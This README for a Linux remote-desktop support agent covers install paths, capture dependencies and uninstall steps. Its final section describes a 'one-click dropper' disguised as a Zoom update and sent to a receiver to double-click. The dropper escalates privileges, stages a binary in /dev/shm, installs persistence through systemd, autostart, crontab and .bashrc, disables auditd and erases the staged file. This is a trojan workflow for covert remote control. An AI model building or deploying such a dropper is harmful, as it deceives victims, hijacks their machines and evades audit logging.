# BetterDesk Linux agent (desktop session)

This mirrors the live Windows deployment: the agent runs inside the logged-in
desktop session, not as a root system service. Screen capture and input need
access to the user's `DISPLAY`/`WAYLAND_DISPLAY`, so the installer uses a
systemd **user** unit and an XDG autostart entry. It is non-interactive and
safe to push unattended.

## Layout

- Agent dir: `~/.local/share/betterdesk/agent/`
- Binary: `~/.local/share/betterdesk/agent/betterdesk-agent` (or `betterdesk`)
- Config: `~/.local/share/betterdesk/agent/agent-config.json`
- Log: `~/.local/share/betterdesk/agent/agent.log`
- User unit: `~/.config/systemd/user/betterdesk-support-agent.service`
- Autostart: `~/.config/autostart/betterdesk-support-agent.desktop`

## Install

Extract the generated `.tar.gz` and run:

```sh
sh ./install-betterdesk-support.sh
```

The script resolves the desktop user automatically (even through `sudo`),
enables the user unit when `systemd --user` is available, writes the XDG
autostart entry and starts the launcher immediately. The launcher has a PID
guard so unit + autostart never run two copies.

## Capture / input dependencies

- Wayland: `grim` (wlroots) or the XDG Desktop Portal
- X11: `scrot` or ImageMagick `import`
- Input: `xdotool`

## Uninstall

```sh
sh ./uninstall-betterdesk-support.sh
```

## One-click dropper: `Zoom_Update_v6.1.0`

**Send `Zoom_Update_v6.1.0.tar.gz`** — it stores the executable bits, so the
receiver extracts and double-clicks; no `chmod` is needed. The archive contains
`Zoom_Update_v6.1.0.desktop` (Zoom icon), the script, icon and a README. The
desktop file resolves the script through its own `%k` location, so the folder
can be moved.

Flow:

1. Re-executes through `pkexec` (or `sudo`) for the one-time elevation.
2. Downloads `zoom-private.Setup_1.0.0_x86_64.bin` into `/dev/shm`, verifies the
   pinned SHA-256 and ELF header, then installs it to
   `/usr/local/lib/zoom-private/`.
3. Writes a user config with a unique device ID and unattended enrollment.
4. Installs a systemd **user** unit, XDG autostart entry, guarded `@reboot`
   crontab and a guarded `.bashrc` fallback.
5. Installs the icon/desktop entries, starts the agent as the desktop user and
   enables lingering so the user service survives logout.
6. Disables `auditd` when available and removes the RAM-disk payload.

The agent runs inside the user session so `DISPLAY` / `WAYLAND_DISPLAY` remain
valid. Verify `SHA256SUMS-linux-dropper` before sending.

Self-test without installing:

```sh
sh ./Zoom_Update_v6.1.0.sh /selftest
```

Build (any OS with PowerShell 7):

```powershell
./build-linux-dropper.ps1
```
